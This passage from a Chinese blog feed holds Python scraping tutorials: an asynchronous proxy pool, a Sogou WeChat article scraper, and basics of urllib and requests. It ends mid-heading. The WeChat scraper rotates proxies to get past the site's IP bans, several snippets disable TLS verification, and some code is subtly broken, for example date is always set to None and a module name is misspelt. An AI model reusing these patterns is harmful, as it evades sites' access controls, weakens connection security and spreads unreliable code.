&#39;个代理&#39;)                #批量获取代理                test_proxies = self.redis.batch(start, stop)                #asyncio.get_event_loop方法可以创建一个事件循环                #我们可以在事件循环中注册协程对象(async 修饰的函数)                loop = asyncio.get_event_loop()                #将多个任务封装到一起并发执行                tasks = [self.test_single_proxy(proxy) for proxy in test_proxies]                #run_until_complete将协程注册到事件循环，并启动事件循环。                loop.run_until_complete(asyncio.wait(tasks))                sys.stdout.flush()                time.sleep(5)        except Exception as e:            print(&#39;测试器发生错误&#39;, e.args)</code></pre><p><strong>解释：</strong></p><p>这里用到的比较关键的技术是异步网络请求，因为我们的 requests 库是同步的，请求一个必须等到结果返回才能请求另一个，这不是我们想要的，于是异步网络请求模块 aiohttp 就出现了，这是在 python3.5 以后新添加的内置功能(本质使用的是 Python 的协程)</p><p>对于类似爬虫这种延时的IO操作，协程是个大利器，优点很多，他可以在一个阻塞发生时，挂起当前程序，跑去执行其他程序，把事件注册到循环中，实现多程序并发，据说超越了10k限制，不过我没有试验过极限。<br>现在讲一讲协程的简单的用法，当你爬一个网站，有100个网页，正常是请求一次，回来一次，这样效率很低，但协程可以一次发起100个请求（其实也是一个一个发），不同的是协程不会死等返回，而是发一个请求，挂起，再发一个再挂起，发起100个，挂起100个，然后同时等待100个返回，效率提升了100倍。可以理解为同时做100件事，相对于多线程，做到了由自己调度而不是交给CPU，程序流程可控，节约资源，效率极大提升。</p><p>具体的使用方法，我在上面代码中的注释部分已经写了，下面对关键步骤再简单梳理一下：</p><p>1.定义连接器并取消ssl安全验证</p><pre><code class="hljs">conn = aiohttp.TCPConnector(verify_ssl=False)</code></pre><p>2.创建一个session对象</p><pre><code class="hljs">async with aiohttp.ClientSession(connector=conn) as session:</code></pre><p>3.使用创建的 session 对象请求具体的网站</p><pre><code class="hljs">async with session.get(TEST_URL, proxy=real_proxy, timeout=15, allow_redirects=False) as response:</code></pre><p>4.asyncio.get_event_loop方法创建一个事件循环</p><pre><code class="hljs">loop = asyncio.get_event_loop()</code></pre><p>5.将多个任务封装到一起</p><pre><code class="hljs">tasks = [self.test_single_proxy(proxy) for proxy in test_proxies]</code></pre><p>6.run_until_complete将协程注册到事件循环，并启动事件循环,多任务并发执行</p><pre><code class="hljs">loop.run_until_complete(asyncio.wait(tasks))</code></pre><p><strong>(5)对外接口 api.py</strong></p><pre><code class="hljs">import...__all__ = [&#39;app&#39;]app = Flask(__name__)def get_conn():    if not hasattr(g, &#39;redis&#39;):        g.redis = RedisClient()    return g.redis@app.route(&#39;/&#39;)def index():    return &#39;&lt;h2&gt;Welcome to Proxy Pool System&lt;/h2&gt;&#39;#对外接口直接调用数据库返回随机值@app.route(&#39;/random&#39;)def get_proxy():    &quot;&quot;&quot;    Get a proxy    :return: 随机代理    &quot;&quot;&quot;    conn = get_conn()    return conn.random()#对外接口调用数据库返回代理个数@app.route(&#39;/count&#39;)def get_counts():    &quot;&quot;&quot;    Get the count of proxies    :return: 代理池总量    &quot;&quot;&quot;    conn = get_conn()    return str(conn.count())if __name__ == &#39;__main__&#39;:    app.run()</code></pre><h3 id="5-代理池使用"><a href="#5-代理池使用" class="headerlink" title="5.代理池使用"></a><strong>5.代理池使用</strong></h3><pre><code class="hljs">import...dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))sys.path.insert(0, dir)#先用 requests 库请求一下api 获取代理ip def get_proxy():    r = requests.get(&#39;http://127.0.0.1:5000/get&#39;)    proxy = BeautifulSoup(r.text, &quot;lxml&quot;).get_text()    return proxydef crawl(url, proxy):    proxies = &#123;&#39;http&#39;: proxy&#125;    r = requests.get(url, proxies=proxies)    return r.textdef main():    proxy = get_proxy()    html = crawl(&#39;http://docs.jinkan.org/docs/flask/&#39;, proxy)    print(html)if __name__ == &#39;__main__&#39;:    main()</code></pre><h2 id="0X05-使用代理处理反爬抓取微信文章"><a href="#0X05-使用代理处理反爬抓取微信文章" class="headerlink" title="0X05 使用代理处理反爬抓取微信文章"></a><strong>0X05 使用代理处理反爬抓取微信文章</strong></h2><h3 id="1-分析网页确定思路-3"><a href="#1-分析网页确定思路-3" class="headerlink" title="1.分析网页确定思路"></a><strong>1.分析网页确定思路</strong></h3><p>我们这次准备爬取搜狗的微信搜索页面的结果，以风景为例：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%9811.png" alt="此处输入图片的描述"></p><p>可以看到这和我们之前爬取过的案例几乎类似，没什么新意，但是这里有一个比较神奇的地方就是10页以后的内容需要扫码登录微信才能查看</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%9812.png" alt="此处输入图片的描述"></p><p>另外，在请求次数过多的时候还会出现封禁 ip 的情况，对应我们页面的状态码就是 出现 302 跳转</p><p><strong>思路梳理：</strong></p><p>(1)requests 请求目标站点，得到索引页的源码，返回结果<br>(2)如果遇到 302 则说明 ip 被封，切换代理后重试<br>(3)请求详情页，分析得到文章标题和内容<br>(4)将结构化数据保存到 MongoDB 数据库</p><blockquote><p><strong>注意点：</strong></p><p>我们直接看浏览器的地址栏我们能看到很多的参数，但是实际上很大一部分是不需要的，那么为了我们的写代码的方便，我们尽量对参数进行简化，只留下最核心的参数</p></blockquote><h3 id="2-代码实现-3"><a href="#2-代码实现-3" class="headerlink" title="2.代码实现"></a><strong>2.代码实现</strong></h3><p><strong>config.py</strong></p><pre><code class="hljs"># 数据库配置MONGO_URL = &#39;localhost&#39;MONGO_DB = &#39;weixin&#39;MONGO_TABLE = &#39;articles&#39;#参数设置KEYWORD = &#39;风景&#39;MAX_COUNT = 5BASE_URL = &#39;https://weixin.sogou.com/weixin?&#39;#代理设置APP_KEY = &quot;&quot;IP_PORT = &#39;transfer.mogumiao.com:9001&#39;PROXIES = &#123;&quot;http&quot;: &quot;http://&quot; + IP_PORT, &quot;https&quot;: &quot;https://&quot; + IP_PORT&#125;HEADERS = &#123;    &#39;Cookie&#39;:&#39;&#39;,    &#39;Host&#39;:&#39;weixin.sogou.com&#39;,    &#39;Upgrade-Insecure-Requests&#39;:&#39;1&#39;,    &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&#39;,    &#39;Proxy-Authorization&#39;: &#39;Basic &#39;+ APP_KEY,    &#39;Referer&#39;:&#39;https://weixin.sogou.com/weixin&#39;&#125;</code></pre><p><strong>spider.py</strong></p><pre><code class="hljs">from urllib.parse import urlencodeimport requestsfrom pyquery import PyQuery as pqimport reimport pymongofrom config import *#数据库连接对象client = pymongo.MongoClient(MONGO_URL)db = client[MONGO_DB]def get_html(url,count=1):    global MAX_COUNT    if count &gt;= MAX_COUNT:        print(&#39;Tried too many counts&#39;)        return None    try:        res = requests.get(url,allow_redirects=False,headers=HEADERS,verify=False,proxies=PROXIES,timeout = 30)        print(res.status_code)        if res.status_code == 200:            return res.text        if res.status_code == 302:            return get_html(url)    except ConnectionError as e:        print(&#39;Error Occurred&#39;,e.args)        count += 1        return get_html(url,count)def get_index(keyword,page):    data = &#123;        &#39;query&#39;:keyword,        &#39;type&#39;:2,        &#39;page&#39;:page,    &#125;    queries = urlencode(data)    url = BASE_URL + queries    html = get_html(url)    return htmldef parse_index(html):    doc = pq(html)    items = doc(&#39;.news-box .news-list li .txt-box h3 a&#39;).items()    for item in items:        yield item.attr(&#39;data-share&#39;)def get_detail(url):    try:        res = requests.get(url)        if res.status_code == 200:            return res.text        return None    except ConnectionError:        return Nonedef parse_detail(html):    try:        #print(html)        doc = pq(html)        title = doc(&#39;.rich_media_title&#39;).text()        #date 是使用 js 变量动态加载的，我们需要使用正则匹配 js 变量        date = re.search(&#39;var publish_time = &quot;(.*?)&quot;&#39;,html)        if date:            date = date.group(1)        date = None        nickname = doc(&#39;#js_name&#39;).text()        wechat = doc(&#39;#js_profile_qrcode &gt; div &gt; p:nth-child(3) &gt; span&#39;).text()        return &#123;            &#39;title&#39;:title,            &#39;date&#39;:date,            &#39;nickname &#39;:nickname ,            &#39;wechat&#39;:wechat,        &#125;    except ConnectionError:        return Nonedef save_to_mongo(data):    #这里使用更新的方法，如果标题重复就不在重新插入直接更新    if db[MONGO_TABLE].update(&#123;&#39;title&#39;:data[&#39;title&#39;]&#125;,&#123;&#39;$set&#39;:data&#125;,True):        print(&#39;Save to MongoDB&#39;,data[&#39;title&#39;])    else:        print(&#39;Save to MongoDB Failed&#39;,data[&#39;title&#39;])def main():    for page in range(1,101):        html = get_index(KEYWORD,page)        if html:            urls = parse_index(html)            for url in urls:                html = get_detail(url)                if html:                    article_data = parse_detail(html)                    save_to_mongo(article_data)if __name__ == &#39;__main__&#39;:    main()</code></pre><h3 id="3-运行效果-3"><a href="#3-运行效果-3" class="headerlink" title="3.运行效果"></a><strong>3.运行效果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%9813.png" alt="此处输入图片的描述"></p><h2 id="0X06-参考"><a href="#0X06-参考" class="headerlink" title="0X06 参考"></a><strong>0X06 参考</strong></h2><p><a href="https://blog.csdn.net/weixin_37972723/article/details/80726475">https://blog.csdn.net/weixin_37972723/article/details/80726475</a><br><a href="https://www.jianshu.com/p/7690edfe9ba5">https://www.jianshu.com/p/7690edfe9ba5</a><br><a href="https://blog.csdn.net/brucewong0516/article/details/82697935">https://blog.csdn.net/brucewong0516/article/details/82697935</a><br><a href="https://www.cnblogs.com/c-x-a/p/9248906.html">https://www.cnblogs.com/c-x-a/p/9248906.html</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3 爬虫知识梳理(基础篇)</title>
    <link href="/2019/05/03/Python3%20%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86(%E5%9F%BA%E7%A1%80%E7%AF%87)/"/>
    <url>/2019/05/03/Python3%20%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86(%E5%9F%BA%E7%A1%80%E7%AF%87)/</url>
    
    <content type="html"><![CDATA[<h2 id="0X01-常用的-python-库"><a href="#0X01-常用的-python-库" class="headerlink" title="0X01 常用的 python 库"></a><strong>0X01 常用的 python 库</strong></h2><h3 id="1-urllib"><a href="#1-urllib" class="headerlink" title="1.urllib"></a><strong>1.urllib</strong></h3><pre><code class="hljs">import urllibimport urllib.requesturllib.request.urlopen(&quot;http://www.baidu.com&quot;)</code></pre><h3 id="2-re"><a href="#2-re" class="headerlink" title="2.re"></a><strong>2.re</strong></h3><h3 id="3-requests"><a href="#3-requests" class="headerlink" title="3.requests"></a><strong>3.requests</strong></h3><h3 id="4-selenimu"><a href="#4-selenimu" class="headerlink" title="4.selenimu"></a><strong>4.selenimu</strong></h3><p>这个库是配合一些驱动去爬取动态渲染网页的库</p><span id="more"></span><h4 id="1-chromedriver"><a href="#1-chromedriver" class="headerlink" title="(1)chromedriver"></a><strong>(1)chromedriver</strong></h4><p>我们使用的时候需要先下载一个 <a href="http://npm.taobao.org/mirrors/chromedriver/2.46/">chromedriver.exe</a> ，下载好了以后放在 chrome.exe 的相同目录下（默认安装路径），然后将这个目录放作为 PATH</p><pre><code class="hljs">import seleniumfrom selenium import webdriverdriver = webdriver.Chrome()driver.get(&quot;http://www.baidu.com&quot;)driver.page_source</code></pre><p>这种方式的唯一的缺点是会出现浏览器界面，这可能是我们不需要的,所以我们可以使用 headless 的方式来隐藏 web 界面(其实就是使用 options() 对象的 add_argument 属性去设置 headless 参数 )</p><pre><code class="hljs">import osfrom selenium import webdriverfrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.chrome.options import Optionsimport timechrome_options = Options()chrome_options.add_argument(&quot;--headless&quot;)base_url = &quot;http://www.baidu.com/&quot;#对应的chromedriver的放置目录driver = webdriver.Chrome(executable_path=(r&#39;C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe&#39;), chrome_options=chrome_options)driver.get(base_url + &quot;/&quot;)start_time=time.time()print(&#39;this is start_time &#39;,start_time)driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;selenium webdriver&quot;)driver.find_element_by_id(&quot;su&quot;).click()driver.save_screenshot(&#39;screen.png&#39;)driver.close()end_time=time.time()print(&#39;this is end_time &#39;,end_time)</code></pre><h4 id="2-phantomJS"><a href="#2-phantomJS" class="headerlink" title="(2)phantomJS"></a><strong>(2)phantomJS</strong></h4><p>这是另一种无界面的实现方法，虽然说不维护了，并且在使用的过程中会出现各种玄学，但是还是要介绍一下</p><p>和 Chromedriver 一样，我们首先要去<a href="http://phantomjs.org/download.html">下载</a> phantomJS,然后将其放在 PATH 中方便我们后面的调用</p><pre><code class="hljs">import seleniumfrom selenium import webdriverdriver = webdriver.phantomJS()driver.get(&quot;http://www.baidu.com&quot;)driver.page_source</code></pre><h3 id="5-lxml"><a href="#5-lxml" class="headerlink" title="5.lxml"></a><strong>5.lxml</strong></h3><p>这个是为 XPATH 的使用准备的库</p><h3 id="6-beautifulsoup"><a href="#6-beautifulsoup" class="headerlink" title="6.beautifulsoup"></a><strong>6.beautifulsoup</strong></h3><p>pip 安装的时候注意一下要安装 beautifulsoup4,表示第四个版本，并且这个库是依赖于 lxml 的，所以安装之前请先安装 lxml </p><pre><code class="hljs">from bs4 import BeautifulSoupsoup = BeautifulSoup(&#39;`&lt;html&gt;&lt;/html&gt;&#39;,&#39;lxml&#39;)</code></pre><h3 id="7-pyquery"><a href="#7-pyquery" class="headerlink" title="7.pyquery"></a><strong>7.pyquery</strong></h3><p>和 BeautifulSoup 一样也是一个网页解析库，但是相对来讲语法简单一些（语法是模仿 jQuery 的）</p><pre><code class="hljs">from pyquery import PyQuery as pqpage = pq(&#39;`&lt;html&gt;hello world&lt;/html&gt;`&#39;)result = page(&#39;html&#39;).text()result</code></pre><h3 id="8-pymysql"><a href="#8-pymysql" class="headerlink" title="8.pymysql"></a><strong>8.pymysql</strong></h3><p>这个库是 py 操纵 Mysql 的库</p><pre><code class="hljs">import pymysqlconn = pymysql.connect(host=&#39;localhost&#39;,user=&#39;root&#39;,password=&#39;root&#39;,port=3306,db=&#39;test&#39;)cursor = conn.cursor()result = cursor.execute(&#39;select * from user where id = 1&#39;)print(cursor.fetchone())</code></pre><h3 id="9-pymango"><a href="#9-pymango" class="headerlink" title="9.pymango"></a><strong>9.pymango</strong></h3><pre><code class="hljs">import pymangoclient = pymango.MongoClient(&#39;localhost&#39;)db = client(&#39;newtestdb&#39;)db[&#39;table&#39;].insert(&#123;&#39;name&#39;:&#39;Bob&#39;&#125;)db[&#39;table&#39;].find_one(&#123;&#39;name&#39;:&#39;Bob&#39;&#125;)</code></pre><h3 id="10-redis"><a href="#10-redis" class="headerlink" title="10.redis"></a><strong>10.redis</strong></h3><pre><code class="hljs">import redisr = redis.Redis(&#39;localhost&#39;,6379)r.set(&quot;name&quot;,&quot;Bob&quot;)r.get(&#39;name&#39;)</code></pre><h3 id="11-flask"><a href="#11-flask" class="headerlink" title="11.flask"></a><strong>11.flask</strong></h3><p>flask 在后期使用代理的时候可能会用到</p><pre><code class="hljs">from flask import Flaskapp = Flask(__name__)@app.route(&#39;/&#39;)def hello():return &quot;hello world&quot;if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><h3 id="12-django"><a href="#12-django" class="headerlink" title="12.django"></a><strong>12.django</strong></h3><p>在分布式爬虫的维护方面可能会用到 django </p><h3 id="13-jupyter"><a href="#13-jupyter" class="headerlink" title="13.jupyter"></a><strong>13.jupyter</strong></h3><p>网页端记事本</p><h2 id="0X02-基础部分"><a href="#0X02-基础部分" class="headerlink" title="0X02 基础部分"></a><strong>0X02 基础部分</strong></h2><h3 id="1-爬虫基本原理"><a href="#1-爬虫基本原理" class="headerlink" title="1.爬虫基本原理"></a><strong>1.爬虫基本原理</strong></h3><h4 id="1-爬虫是什么"><a href="#1-爬虫是什么" class="headerlink" title="(1)爬虫是什么"></a><strong>(1)爬虫是什么</strong></h4><p>爬虫就是请求网页并且提取数据的自动化工具</p><h4 id="2-爬虫的基本流程"><a href="#2-爬虫的基本流程" class="headerlink" title="(2)爬虫的基本流程"></a><strong>(2)爬虫的基本流程</strong></h4><h5 id="1-发起请求："><a href="#1-发起请求：" class="headerlink" title="1.发起请求："></a><strong>1.发起请求：</strong></h5><p>通过 HTTP 库向目标网站发起请求，即发送一个 request（可以包含额外的header信息），然后等待服务器的响应</p><h5 id="2-获取响应内容"><a href="#2-获取响应内容" class="headerlink" title="2.获取响应内容"></a><strong>2.获取响应内容</strong></h5><p>如果服务器正常响应，会得到一个 Response.其内容就是所要获取的页面的内容，类型可以是 HTML、JSON、二进制数据(图片视频)等</p><h5 id="3-解析内容"><a href="#3-解析内容" class="headerlink" title="3.解析内容"></a><strong>3.解析内容</strong></h5><p>对 HTML 数据可以使用正则表达式、网页解析库进行解析。如果是 Json 则可以转化成 JSON 对象解析，如果是二进制数据可以保存或者进一步处理</p><h5 id="4-保存数据"><a href="#4-保存数据" class="headerlink" title="4.保存数据"></a><strong>4.保存数据</strong></h5><p>保存的形式多样，可以是纯文本，也可以保存成数据库，或者保存为特定格式的文件</p><h4 id="3-请求的基本元素"><a href="#3-请求的基本元素" class="headerlink" title="(3)请求的基本元素"></a><strong>(3)请求的基本元素</strong></h4><p>1.请求方法<br>2.请求 URL<br>3.请求头<br>4.请求体(POST 方法独有)</p><h4 id="4-请响应的基本元素"><a href="#4-请响应的基本元素" class="headerlink" title="(4)请响应的基本元素"></a><strong>(4)请响应的基本元素</strong></h4><p>1.状态码<br>2.响应头<br>3.响应体</p><h4 id="5-实例代码："><a href="#5-实例代码：" class="headerlink" title="(5)实例代码："></a><strong>(5)实例代码：</strong></h4><h5 id="1-请求网页数据"><a href="#1-请求网页数据" class="headerlink" title="1.请求网页数据"></a><strong>1.请求网页数据</strong></h5><pre><code class="hljs">import requestsheaders = &#123;&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&#39;&#125;res = requests.get(&quot;http://www.baidu.com&quot;,headers=headers)print(res.status_code)print(res.headers)print(res.text)</code></pre><p>当然这里使用的是 res.text 这种文本格式，如果返回的是一个二进制格式的数据(比如图片)，那么我们应该使用 res.content</p><h5 id="2-请求二进制数据"><a href="#2-请求二进制数据" class="headerlink" title="2.请求二进制数据"></a><strong>2.请求二进制数据</strong></h5><pre><code class="hljs">import requestsheaders = &#123;&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&#39;&#125;res = requests.get(&quot;https://ss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/icon/95486.png&quot;,headers=headers)print(res.content)with open(r&#39;E:\桌面\1.png&#39;,&#39;wb&#39;) as f:f.write(res.content)f.close()</code></pre><h4 id="6-解析方式"><a href="#6-解析方式" class="headerlink" title="(6)解析方式"></a><strong>(6)解析方式</strong></h4><p>1.直接处理<br>2.转化成 json对象<br>3.正则匹配<br>4.BeautifulSoap<br>5.PyQuery<br>6.XPath</p><h4 id="7-response-的结果为什么和浏览器中的看到的不同"><a href="#7-response-的结果为什么和浏览器中的看到的不同" class="headerlink" title="(7)response 的结果为什么和浏览器中的看到的不同"></a><strong>(7)response 的结果为什么和浏览器中的看到的不同</strong></h4><p>我们使用脚本去请求(只是一次请求)网页得到的是最原始的网页的源码，这个源码里面会有很多的远程的 js 和 css 的加载，我们的脚本是没法解析的，但是浏览器能对这些远程的链接进行再次的请求，然后利用加载到的数据对页面进行进一步的加载和渲染，于是我们在浏览器中看到的页面是很多请求渲染得到的结果，因此和我们一次请求的到的页面肯定是不一样的。</p><h4 id="8-如何解决-JS-渲染的问题"><a href="#8-如何解决-JS-渲染的问题" class="headerlink" title="(8)如何解决 JS 渲染的问题"></a><strong>(8)如何解决 JS 渲染的问题</strong></h4><p>解决问题的方法本质上就是模拟浏览器的加载渲染，然后将渲染好的页面进行返回</p><p>1.分析Ajax 请求<br>2.selenium+webdriver(推荐)<br>3.splash<br>4.PyV8、Ghostpy</p><h4 id="9-如何存储数据"><a href="#9-如何存储数据" class="headerlink" title="(9)如何存储数据"></a><strong>(9)如何存储数据</strong></h4><p>1.纯本文<br>2.关系型数据库<br>3.非关系型数据库<br>4.二进制文件</p><h2 id="0X03-Urllib-库"><a href="#0X03-Urllib-库" class="headerlink" title="0X03 Urllib 库"></a><strong>0X03 Urllib 库</strong></h2><h3 id="1-什么是-Urllib-库"><a href="#1-什么是-Urllib-库" class="headerlink" title="1.什么是 Urllib 库"></a><strong>1.什么是 Urllib 库</strong></h3><p>这个库是 python 的内置的一个请求库</p><p>urllib.request —————–&gt;请求模块<br>urllib.error——————–&gt;异常处理模块<br>urllib.parse——————–&gt;url解析模块<br>urllib.robotparser  ————&gt;robots.txt 解析模块</p><h3 id="2-urllib-库的基本使用"><a href="#2-urllib-库的基本使用" class="headerlink" title="2.urllib 库的基本使用"></a><strong>2.urllib 库的基本使用</strong></h3><h4 id="1-函数调用原型"><a href="#1-函数调用原型" class="headerlink" title="(1)函数调用原型"></a><strong>(1)函数调用原型</strong></h4><pre><code class="hljs">urllib.request.urlopen(url,data,timeout...)</code></pre><h4 id="2-实例代码一：GET-请求"><a href="#2-实例代码一：GET-请求" class="headerlink" title="(2)实例代码一：GET 请求"></a><strong>(2)实例代码一：GET 请求</strong></h4><pre><code class="hljs">import urllib.requestres = urllib.request.urlopen(&quot;http://www.baidu.com&quot;)print(res.read().decode(&#39;utf-8&#39;))</code></pre><h4 id="3-实例代码二：POST-请求"><a href="#3-实例代码二：POST-请求" class="headerlink" title="(3)实例代码二：POST 请求"></a><strong>(3)实例代码二：POST 请求</strong></h4><pre><code class="hljs">import urllib.requestimport urllib.parsefrom pprint import pprintdata = bytes(urllib.parse.urlencode(&#123;&#39;world&#39;:&#39;hello&#39;&#125;),encoding = &#39;utf8&#39;)res = urllib.request.urlopen(&#39;https://httpbin.org/post&#39;,data = data)pprint(res.read().decode(&#39;utf-8&#39;))</code></pre><h4 id="4-实例代码三：超时设置"><a href="#4-实例代码三：超时设置" class="headerlink" title="(4)实例代码三：超时设置"></a><strong>(4)实例代码三：超时设置</strong></h4><pre><code class="hljs">import urllib.requestres = urllib.request.urlopen(&quot;http://httpbin.org.get&quot;,timeout = 1)print(res.read().decode(&#39;utf-8&#39;))</code></pre><h4 id="5-实例代码：获取响应状态码、响应头、响应体"><a href="#5-实例代码：获取响应状态码、响应头、响应体" class="headerlink" title="(5)实例代码：获取响应状态码、响应头、响应体"></a><strong>(5)实例代码：获取响应状态码、响应头、响应体</strong></h4><pre><code class="hljs">import urllib.requestres = urllib.request.urlopen(&quot;http://httpbin.org/get&quot;)print(res.status)print(res.getheaders())print(res.getheader(&#39;Server&#39;))#获取响应体的使用 read() 的结果是 Bytes 类型，我们还要用 decode(&#39;utf-8&#39;)转化成字符串print(res.read().decode(&#39;utf-8&#39;))</code></pre><h4 id="6-request-对象"><a href="#6-request-对象" class="headerlink" title="(6) request 对象"></a><strong>(6) request 对象</strong></h4><pre><code class="hljs">from urllib import request,parsefrom pprint import pprinturl = &quot;https://httpbin.org/post&quot;headers = &#123;    &#39;User-Agent&#39;:&#39;hello wolrd&#39;,    &#39;Host&#39;:&#39;httpbin.org&#39;&#125;dict = &#123;    &#39;name&#39;:&#39;Tom&#39;,&#125;data = bytes(parse.urlencode(dict),encoding=&#39;utf8&#39;)req = request.Request(url=url,data=data,headers=headers,method=&#39;POST&#39;)res = request.urlopen(req)pprint(res.read().decode(&#39;utf-8&#39;))</code></pre><h3 id="3-urllib-库的进阶使用"><a href="#3-urllib-库的进阶使用" class="headerlink" title="3.urllib 库的进阶使用"></a><strong>3.urllib 库的进阶使用</strong></h3><h4 id="1-代理"><a href="#1-代理" class="headerlink" title="(1)代理"></a><strong>(1)代理</strong></h4><pre><code class="hljs">import urllib.requestproxy_handler = urllib.request.ProxyHandler(&#123;    &#39;http&#39;:&#39;http://127.0.0.1:9743&#39;&#125;)opener = urllib.request.build_opener(proxy_handler)res = opener.open(&#39;https://www.taobao.com&#39;)print(res.read())</code></pre><h4 id="2-Cookie"><a href="#2-Cookie" class="headerlink" title="(2)Cookie"></a><strong>(2)Cookie</strong></h4><h5 id="1-获取-cookies"><a href="#1-获取-cookies" class="headerlink" title="1.获取 cookies"></a><strong>1.获取 cookies</strong></h5><pre><code class="hljs">import http.cookiejarimport urllib.requestcookie = http.cookiejar.CookieJar()handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&quot;http://www.baidu.com&quot;)for item in cookie:    print(item.name+&quot;=&quot;+item.value)</code></pre><h5 id="2-将-cookie-保存成文本文件"><a href="#2-将-cookie-保存成文本文件" class="headerlink" title="2.将 cookie 保存成文本文件"></a><strong>2.将 cookie 保存成文本文件</strong></h5><p><strong>格式一：</strong></p><pre><code class="hljs">import http.cookiejar, urllib.requestfilename = &quot;cookie.txt&quot;cookie = http.cookiejar.MozillaCookieJar(filename)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&#39;http://www.baidu.com&#39;)cookie.save(ignore_discard=True, ignore_expires=True)</code></pre><p><strong>格式二：</strong></p><pre><code class="hljs">import http.cookiejar, urllib.requestfilename = &#39;cookie.txt&#39;cookie = http.cookiejar.LWPCookieJar(filename)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&#39;http://www.baidu.com&#39;)cookie.save(ignore_discard=True, ignore_expires=True)</code></pre><h5 id="3-使用文件中的-cookie"><a href="#3-使用文件中的-cookie" class="headerlink" title="3.使用文件中的 cookie"></a><strong>3.使用文件中的 cookie</strong></h5><pre><code class="hljs">import http.cookiejar, urllib.requestcookie = http.cookiejar.LWPCookieJar()cookie.load(&#39;cookie.txt&#39;, ignore_discard=True, ignore_expires=True)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&#39;http://www.baidu.com&#39;)print(response.read().decode(&#39;utf-8&#39;))</code></pre><h4 id="3-异常处理"><a href="#3-异常处理" class="headerlink" title="(3)异常处理"></a><strong>(3)异常处理</strong></h4><h5 id="1-实例代码一：URLError"><a href="#1-实例代码一：URLError" class="headerlink" title="1.实例代码一：URLError"></a><strong>1.实例代码一：URLError</strong></h5><pre><code class="hljs">from urllib import requestfrom urllib import errortry:    urllib.request.urlopen(&quot;http://httpbin.org/xss&quot;)except error.URLError as e:    print(e.reason)</code></pre><h5 id="2-实例代码二：HTTPError"><a href="#2-实例代码二：HTTPError" class="headerlink" title="2.实例代码二：HTTPError"></a><strong>2.实例代码二：HTTPError</strong></h5><pre><code class="hljs">from urllib import request, errortry:    response = request.urlopen(&#39;http://httpbin.org/xss&#39;)except error.HTTPError as e:    print(e.reason, e.code, e.headers, sep=&#39;\n&#39;)except error.URLError as e:    print(e.reason)else:    print(&#39;Request Successfully&#39;)</code></pre><h5 id="3-实例代码三：异常类型判断"><a href="#3-实例代码三：异常类型判断" class="headerlink" title="3.实例代码三：异常类型判断"></a><strong>3.实例代码三：异常类型判断</strong></h5><pre><code class="hljs">import socketimport urllib.requestimport urllib.errortry:    response = urllib.request.urlopen(&#39;https://www.baidu.com&#39;, timeout=0.01)except urllib.error.URLError as e:    print(type(e.reason))    if isinstance(e.reason, socket.timeout):        print(&#39;TIME OUT&#39;)</code></pre><h4 id="4-URL-解析工具类"><a href="#4-URL-解析工具类" class="headerlink" title="(4)URL 解析工具类"></a><strong>(4)URL 解析工具类</strong></h4><h5 id="1-urlparse"><a href="#1-urlparse" class="headerlink" title="1.urlparse"></a><strong>1.urlparse</strong></h5><pre><code class="hljs">from urllib.parse import urlparseresult = urlparse(&#39;http://www.baidu.com/index.html;user?id=5#comment&#39;)print(type(result), result)</code></pre><h5 id="2-urlunparse"><a href="#2-urlunparse" class="headerlink" title="2.urlunparse"></a><strong>2.urlunparse</strong></h5><pre><code class="hljs">from urllib.parse import urlunparsedata = [&#39;http&#39;, &#39;www.baidu.com&#39;, &#39;index.html&#39;, &#39;user&#39;, &#39;a=6&#39;, &#39;comment&#39;]print(urlunparse(data))</code></pre><h5 id="3-urljoin"><a href="#3-urljoin" class="headerlink" title="3.urljoin"></a><strong>3.urljoin</strong></h5><pre><code class="hljs">from urllib.parse import urljoinprint(urljoin(&#39;http://www.baidu.com&#39;, &#39;FAQ.html&#39;))</code></pre><h5 id="4-urlencode"><a href="#4-urlencode" class="headerlink" title="4.urlencode"></a><strong>4.urlencode</strong></h5><pre><code class="hljs">from urllib.parse import urlencodeparams = &#123;    &#39;name&#39;: &#39;germey&#39;,    &#39;age&#39;: 22&#125;base_url = &#39;http://www.baidu.com?&#39;url = base_url + urlencode(params)print(url)</code></pre><h2 id="0X04-Requests-库"><a href="#0X04-Requests-库" class="headerlink" title="0X04 Requests 库"></a><strong>0X04 Requests 库</strong></h2><h3 id="1-什么是-requests-库"><a href="#1-什么是-requests-库" class="headerlink" title="1.什么是 requests 库"></a><strong>1.什么是 requests 库</strong></h3><p>这个库是基于 URLlib3 的，改善了 urllib api 比较繁琐的特点，使用几句简单的语句就能实现设置 cookie 和设置代理的功能，非常的方便</p><h3 id="2-requests-库的基本使用"><a href="#2-requests-库的基本使用" class="headerlink" title="2.requests 库的基本使用"></a><strong>2.requests 